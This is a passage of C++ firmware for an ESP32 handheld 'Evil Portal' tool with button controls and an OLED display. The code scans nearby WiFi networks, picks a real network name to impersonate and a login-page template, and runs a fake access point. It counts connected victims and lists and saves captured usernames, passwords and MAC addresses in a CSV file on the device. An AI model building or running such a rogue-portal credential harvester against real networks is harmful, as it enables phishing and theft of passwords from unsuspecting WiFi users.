                .min = 120,
                .max = 200
            }
        }
    };
    
    esp_wifi_scan_start(&scan_config, false);
    currentState = PORTAL_SCANNING;
}

void updateScan() {
    unsigned long now = millis();

    uint16_t currentApCount = 0;
    esp_wifi_scan_get_ap_num(&currentApCount);

    if (currentApCount > portal_lastApCount) {
        processScanResults(now);
        portal_lastApCount = currentApCount;
    }

    if (lastScannedSSIDsSize != (int)scannedSSIDs.size()) {
        lastScannedSSIDsSize = (int)scannedSSIDs.size();
        needsRedraw = true;
    }

    if (now - portal_lastDisplayUpdate > DISPLAY_UPDATE_INTERVAL) {
        portal_lastDisplayUpdate = now;
        needsRedraw = true;
    }

    if (needsRedraw) {
        needsRedraw = false;

        u8g2.clearBuffer();
        u8g2.setFont(u8g2_font_6x10_tr);
        u8g2.drawStr(0, 10, "Scanning WiFi...");

        char countStr[32];
        snprintf(countStr, sizeof(countStr), "Found: %d networks", (int)scannedSSIDs.size());
        u8g2.drawStr(0, 25, countStr);

        int barWidth = 120;
        int barHeight = 10;
        int barX = 4;
        int barY = 35;
        u8g2.drawFrame(barX, barY, barWidth, barHeight);

        unsigned long elapsed = now - portal_scanStartTime;
        int fillWidth = ((elapsed * (barWidth - 4)) / SCAN_DURATION);
        if (fillWidth > (barWidth - 4)) fillWidth = barWidth - 4;
        if (fillWidth > 0) {
            u8g2.drawBox(barX + 2, barY + 2, fillWidth, barHeight - 4);
        }

        u8g2.setFont(u8g2_font_5x8_tr);
        u8g2.drawStr(0, 60, "Press L to exit");
        u8g2.sendBuffer();
        displayMirrorSend(u8g2);
    }
    
    if (now - portal_scanStartTime > SCAN_DURATION) {
        processScanResults(now);
        esp_wifi_scan_stop();

        for (int i = 0; i < customSSIDCount && scannedSSIDs.size() < 100; i++) {
            String customSSID = String(customSSIDs[i]);
            bool exists = false;
            for (const String& existingSSID : scannedSSIDs) {
                if (existingSSID == customSSID) {
                    exists = true;
                    break;
                }
            }
            if (!exists) {
                scannedSSIDs.push_back(customSSID);
            }
        }

        portal_isScanning = false;
        portal_scanCompleted = true;
        portal_lastScanTime = now;
        currentState = PORTAL_MENU;

        if (!scannedSSIDs.empty()) {
            if (currentSSIDIndex >= scannedSSIDs.size()) {
                currentSSIDIndex = 0;
            }
            currentSSID = scannedSSIDs[currentSSIDIndex];
        }
    }
}

void drawPortalMenu() {
    u8g2.clearBuffer();
    
    const char* menuItems[] = {
        "Start Portal",
        "Change Template", 
        "Change SSID",
        "View Captured"
    };
    
    for (int i = 0; i < 4; i++) {
        char itemStr[32];
        bool selected = (menuSelection == i);
        
        if (i == 1) {
            snprintf(itemStr, sizeof(itemStr), "%s %s",
                    selected ? ">" : " ", templateNames[currentTemplate]);
        } else if (i == 2) {
            char maskedSSID[33];
            maskNameEvilPortal(currentSSID.c_str(), maskedSSID, sizeof(maskedSSID) - 1, customSSIDs, customSSIDCount);
            char truncatedSSID[16];
            if (strlen(maskedSSID) > 12) {
                strncpy(truncatedSSID, maskedSSID, 12);
                truncatedSSID[12] = '\0';
                strcat(truncatedSSID, "..");
            } else {
                strlcpy(truncatedSSID, maskedSSID, sizeof(truncatedSSID));
            }
            snprintf(itemStr, sizeof(itemStr), "%s SSID: %s",
                    selected ? ">" : " ", truncatedSSID);
        } else if (i == 3) {
            snprintf(itemStr, sizeof(itemStr), "%s %s (%d)",
                    selected ? ">" : " ", menuItems[i], (int)capturedCreds.size());
        } else {
            snprintf(itemStr, sizeof(itemStr), "%s %s",
                    selected ? ">" : " ", menuItems[i]);
        }
        
        u8g2.setFont(u8g2_font_5x8_tr);
        u8g2.drawStr(0, 12 + (i * 10), itemStr);
    }
    
    u8g2.setFont(u8g2_font_5x8_tr);
    u8g2.drawStr(0, 62, "U/D=Nav  C=OK  L=Exit");
    u8g2.sendBuffer();
    displayMirrorSend(u8g2);
}

void drawPortalStatus() {
    u8g2.clearBuffer();
    u8g2.setFont(u8g2_font_5x8_tr);
    u8g2.drawStr(0, 10, "Portal Running");
    char maskedSSID[33];
    maskNameEvilPortal(currentSSID.c_str(), maskedSSID, sizeof(maskedSSID) - 1, customSSIDs, customSSIDCount);
    char ssidStr[22];
    if (strlen(maskedSSID) > 18) {
        strncpy(ssidStr, maskedSSID, 16);
        ssidStr[16] = '\0';
        strcat(ssidStr, "..");
    } else {
        strlcpy(ssidStr, maskedSSID, sizeof(ssidStr));
    }
    u8g2.drawStr(0, 22, ssidStr);
    char templateStr[22];
    if (strlen(templateNames[currentTemplate]) > 18) {
        strncpy(templateStr, templateNames[currentTemplate], 16);
        templateStr[16] = '\0';
        strcat(templateStr, "..");
    } else {
        strlcpy(templateStr, templateNames[currentTemplate], sizeof(templateStr));
    }
    u8g2.drawStr(0, 34, templateStr);

    char statsStr[32];
    snprintf(statsStr, sizeof(statsStr), "Clients:%d Visits:%d", connectedClients, totalVisitors);
    u8g2.drawStr(0, 46, statsStr);

    u8g2.setFont(u8g2_font_5x8_tr);
    u8g2.drawStr(0, 62, "L=Exit");
    u8g2.sendBuffer();
    displayMirrorSend(u8g2);
}

void drawCredentialsList() {
    u8g2.clearBuffer();
    u8g2.setFont(u8g2_font_5x8_tr);
    
    if (capturedCreds.empty()) {
        u8g2.drawStr(0, 10, "No Credentials");
        u8g2.drawStr(0, 22, "Captured Yet");
        u8g2.setFont(u8g2_font_5x8_tr);
        u8g2.drawStr(0, 62, "L=Exit");
    } else {
        const Credential& cred = capturedCreds[credIndex];

        char maskedSSIDFull[33];
        maskNameEvilPortal(cred.ssid.c_str(), maskedSSIDFull, sizeof(maskedSSIDFull) - 1, customSSIDs, customSSIDCount);
        char ssidStr[22];
        if (strlen(maskedSSIDFull) > 20) {
            strncpy(ssidStr, maskedSSIDFull, 18);
            ssidStr[18] = '\0';
            strcat(ssidStr, "..");
        } else {
            strlcpy(ssidStr, maskedSSIDFull, sizeof(ssidStr));
        }
        u8g2.drawStr(0, 10, "Net:");
        u8g2.drawStr(25, 10, ssidStr);

        char maskedMACFull[18];
        maskMAC(cred.macAddress.c_str(), maskedMACFull);
        char macStr[18];
        if (strlen(maskedMACFull) > 17) {
            strncpy(macStr, maskedMACFull, 17);
            macStr[17] = '\0';
        } else {
            strlcpy(macStr, maskedMACFull, sizeof(macStr));
        }
        u8g2.drawStr(0, 20, "MAC:");
        u8g2.drawStr(25, 20, macStr);

        char userStr[22];
        if (cred.username.length() > 20) {
            strncpy(userStr, cred.username.c_str(), 18);
            userStr[18] = '\0';
            strcat(userStr, "..");
        } else {
            strlcpy(userStr, cred.username.c_str(), sizeof(userStr));
        }
        u8g2.drawStr(0, 30, "User:");
        u8g2.drawStr(30, 30, userStr);

        char passStr[22];
        if (cred.password.length() > 20) {
            strncpy(passStr, cred.password.c_str(), 18);
            passStr[18] = '\0';
            strcat(passStr, "..");
        } else {
            strlcpy(passStr, cred.password.c_str(), sizeof(passStr));
        }
        u8g2.drawStr(0, 40, "Pass:");
        u8g2.drawStr(30, 40, passStr);

        char infoStr[32];
        unsigned long currentTime = millis();
        unsigned long elapsedMs = currentTime - cred.captureTime;
        unsigned long elapsedMinutes = elapsedMs / 60000;
        snprintf(infoStr, sizeof(infoStr), "%d/%d - %lum ago",
                credIndex + 1, (int)capturedCreds.size(), elapsedMinutes);
        u8g2.drawStr(0, 50, infoStr);

        u8g2.setFont(u8g2_font_5x8_tr);
        u8g2.drawStr(0, 62, "U/D=Nav  L=Exit");
    }
    
    u8g2.sendBuffer();
    displayMirrorSend(u8g2);
}

}

void loadSavedPortalCreds() {
    if (!SPIFFS.exists("/portal_creds.csv")) return;
    File f = SPIFFS.open("/portal_creds.csv", FILE_READ);
    if (!f) return;
    while (f.available()) {
        String line = f.readStringUntil('\n');
        if (line.length() < 5) continue;
        int p1 = line.indexOf(',');
        int p2 = line.indexOf(',', p1 + 1);
        int p3 = line.indexOf(',', p2 + 1);
        int p4 = line.indexOf(',', p3 + 1);
        if (p1 < 0 || p2 < 0 || p3 < 0 || p4 < 0) continue;

        Credential c;
        c.ssid = line.substring(0, p1);
        c.username = line.substring(p1 + 1, p2);
        c.password = line.substring(p2 + 1, p3);
        c.macAddress = line.substring(p3 + 1, p4);
        c.captureTime = line.substring(p4 + 1).toInt();
        capturedCreds.push_back(c);
    }
    f.close();
}

void evilPortalSetup() {
    currentState = PORTAL_MENU;
    menuSelection = 0;
    credIndex = 0;
    totalVisitors = 0;
    connectedClients = 0;
    currentSSIDIndex = 0;
    menuEnterTime = millis();

    SPIFFS.begin(true);
    loadSavedPortalCreds();

    needsRedraw = true;
    lastMenuSelection = -1;
    lastCredIndex = -1;
    lastConnectedClients = -1;
    lastTotalVisitors = -1;
    lastCapturedCredsSize = 0;
    lastScannedSSIDsSize = 0;
    lastState = PORTAL_MENU;
    lastCurrentSSID = "";
    lastCurrentTemplate = -1;
    lastStatusUpdate = 0;

    pinMode(BUTTON_PIN_UP, INPUT_PULLUP);
    pinMode(BUTTON_PIN_DOWN, INPUT_PULLUP);
    pinMode(BUTTON_PIN_RIGHT, INPUT_PULLUP);
    pinMode(BUTTON_PIN_LEFT, INPUT_PULLUP);

    esp_netif_init();
    esp_event_loop_create_default();

    initWiFi(WIFI_MODE_STA);

    scannedSSIDs.clear();
    portal_isScanning = true;
    portal_scanCompleted = false;
    portal_lastApCount = 0;
    portal_scanStartTime = millis();
    portal_lastDisplayUpdate = millis();
    
    wifi_scan_config_t scan_config = {
        .ssid = NULL,
        .bssid = NULL,
        .channel = 0,
        .show_hidden = false,
        .scan_type = WIFI_SCAN_TYPE_ACTIVE,
        .scan_time = {
            .active = {
                .min = 120,
                .max = 200
            }
        }
    };
    
    esp_wifi_scan_start(&scan_config, false);
    currentState = PORTAL_SCANNING;
}

void evilPortalLoop() {
    unsigned long now = millis();

    static bool upPressed = false, downPressed = false;
    static bool rightPressed = false, leftPressed = false, centerPressed = false;
    bool upNow = digitalRead(BUTTON_PIN_UP) == LOW;
    bool downNow = digitalRead(BUTTON_PIN_DOWN) == LOW;
    bool rightNow = digitalRead(BUTTON_PIN_RIGHT) == LOW;
    bool leftNow = digitalRead(BUTTON_PIN_LEFT) == LOW;
    bool centerNow = digitalRead(BUTTON_PIN_CENTER) == LOW;

    if (lastState != currentState) {
        lastState = currentState;
        needsRedraw = true;
    }

    if (currentState == PORTAL_SCANNING) {
        updateScan();
        upPressed = upNow;
        downPressed = downNow;
        rightPressed = rightNow;
        leftPressed = leftNow;
        centerPressed = centerNow;
        return;
    }

    switch (currentState) {
        case PORTAL_MENU:
            if (portal_scanCompleted && now - portal_lastScanTime > SCAN_INTERVAL) {
                startScan();
                return;
            }

            if (lastMenuSelection != menuSelection) {
                lastMenuSelection = menuSelection;
                needsRedraw = true;
            }
            if (lastCurrentSSID != currentSSID) {
                lastCurrentSSID = currentSSID;
                needsRedraw = true;
            }
            if (lastCurrentTemplate != currentTemplate) {
                lastCurrentTemplate = currentTemplate;
                needsRedraw = true;
            }
            if (lastCapturedCredsSize != (int)capturedCreds.size()) {
                lastCapturedCredsSize = (int)capturedCreds.size();
                needsRedraw = true;
            }

            if (upNow && !upPressed) {
                menuSelection = (menuSelection - 1 + 4) % 4;
                needsRedraw = true;
                delay(200);
            }
            if (downNow && !downPressed) {
                menuSelection = (menuSelection + 1) % 4;
                needsRedraw = true;
                delay(200);
            }
            if (leftNow && !leftPressed) {
                switch (menuSelection) {
                    case 1:
                        currentTemplate = (currentTemplate - 1 + numTemplates) % numTemplates;
                        needsRedraw = true;
                        break;
                    case 2:
                        if (!scannedSSIDs.empty()) {
                            currentSSIDIndex = (currentSSIDIndex - 1 + scannedSSIDs.size()) % scannedSSIDs.size();
                            currentSSID = scannedSSIDs[currentSSIDIndex];
                        } else {
                            static int ssidIndexL = 0;
                            ssidIndexL = (ssidIndexL - 1 + customSSIDCount) % customSSIDCount;
                            currentSSID = String(customSSIDs[ssidIndexL]);
                        }
                        needsRedraw = true;
                        break;
                }
                delay(200);
            }
            if ((rightNow && !rightPressed) || (centerNow && !centerPressed)) {
                switch (menuSelection) {
                    case 0:
                        setupPortalAP();
                        currentState = PORTAL_RUNNING;
                        needsRedraw = true;
                        break;
                    case 1:
                        currentTemplate = (currentTemplate + 1) % numTemplates;
                        needsRedraw = true;
                        break;
                    case 2:
                        if (!scannedSSIDs.empty()) {
                            currentSSIDIndex = (currentSSIDIndex + 1) % scannedSSIDs.size();
                            currentSSID = scannedSSIDs[currentSSIDIndex];
                        } else {
                            static int ssidIndex = 0;
                            ssidIndex = (ssidIndex + 1) % customSSIDCount;
                            currentSSID = String(customSSIDs[ssidIndex]);
                        }
                        needsRedraw = true;
                        break;
                    case 3:
                        currentState = PORTAL_VIEW_CREDS;
                        credIndex = 0;
                        needsRedraw = true;
                        break;
                }
                while (digitalRead(BUTTON_PIN_CENTER) == LOW) delay(5);
                delay(200);
            }

            if (needsRedraw) {
                needsRedraw = false;
                drawPortalMenu();
            }
            break;
            
        case PORTAL_RUNNING:
            if (leftNow && !leftPressed) {
                stopPortalAP();

                initWiFi(WIFI_MODE_STA);

                currentState = PORTAL_MENU;
                menuEnterTime = millis();
                needsRedraw = true;
                delay(200);
            }
            portalDNS.processNextRequest();
            portalServer.handleClient();

            wifi_sta_list_t stationList;
            esp_wifi_ap_get_sta_list(&stationList);
            connectedClients = stationList.num;

            if (lastConnectedClients != connectedClients) {
                lastConnectedClients = connectedClients;
                needsRedraw = true;
            }
            if (lastTotalVisitors != totalVisitors) {
                lastTotalVisitors = totalVisitors;
                needsRedraw = true;
            }

            if (now - lastStatusUpdate >= statusUpdateInterval) {
                lastStatusUpdate = now;
                needsRedraw = true;
            }

            if (needsRedraw) {
                needsRedraw = false;
                drawPortalStatus();
            }
            break;
            
        case PORTAL_VIEW_CREDS:
            if (lastCredIndex != credIndex) {
                lastCredIndex = credIndex;
                needsRedraw = true;
            }

            if (now - lastStatusUpdate >= statusUpdateInterval) {
                lastStatusUpdate = now;
                needsRedraw = true;
            }

            if (upNow && !upPressed && !capturedCreds.empty()) {
                credIndex = (credIndex - 1 + capturedCreds.size()) % capturedCreds.size();
                needsRedraw = true;
                delay(200);
            }
            if (downNow && !downPressed && !capturedCreds.empty()) {
                credIndex = (credIndex + 1) % capturedCreds.size();
                needsRedraw = true;
                delay(200);
            }
            if (leftNow && !leftPressed) {
                currentState = PORTAL_MENU;
                menuEnterTime = millis();
                needsRedraw = true;
                delay(200);
            }

            if (needsRedraw) {
                needsRedraw = false;
                drawCredentialsList();
            }
            break;
    }
    upPressed = upNow;
    downPressed = downNow;
    rightPressed = rightNow;
    leftPressed = leftNow;
    centerPressed = centerNow;
}

void cleanupEvilPortal() {
    if (currentState == PORTAL_RUNNING) {
        portalServer.stop();
        portalDNS.stop();
    }
    cleanupWiFi();
    // Don't leave captured credentials sitting in heap after exit.
    capturedCreds.clear();
    capturedCreds.shrink_to_fit();
    ap_netif = NULL;
}